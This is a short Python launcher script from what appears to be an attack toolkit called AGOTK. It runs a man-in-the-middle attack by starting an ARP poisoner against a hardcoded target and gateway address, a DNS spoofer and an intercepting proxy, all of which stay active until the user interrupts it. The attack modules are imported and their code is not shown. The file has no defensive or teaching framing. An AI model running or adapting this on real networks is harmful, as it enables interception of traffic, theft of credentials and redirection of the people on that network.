from AGOTK.proxy import MyProxy
import sys
import argparse
from AGOTK import ARPPoisoner
from AGOTK import DNSSpoofer
from AGOTK import ProxyServer

def main(argv) -> None:
    parser: argparse.ArgumentParser = argparse.ArgumentParser()
    parser.add_argument('-i', '--interface', type=str, required=True, help='The interface to use')

    args = parser.parse_args()

    interface: str = args.interface

    # TODO Hardcoded!!!
    ip_target: str = '192.168.200.1'
    ip_gateway: str = '192.168.200.254'

    arp_poisoner: ARPPoisoner = ARPPoisoner(interface, ip_target, ip_gateway)
    arp_poisoner.start()

    dns_spoofer: DNSSpoofer = DNSSpoofer(interface)
    dns_spoofer.start()

    proxy_server: ProxyServer = ProxyServer()
    proxy_server.start()

    try:
        while True:
            pass
    except KeyboardInterrupt:
        print("\nExit...")
        arp_poisoner.stop()
        dns_spoofer.stop()
        proxy_server.stop()

if __name__ == "__main__":
    main(sys.argv[1:])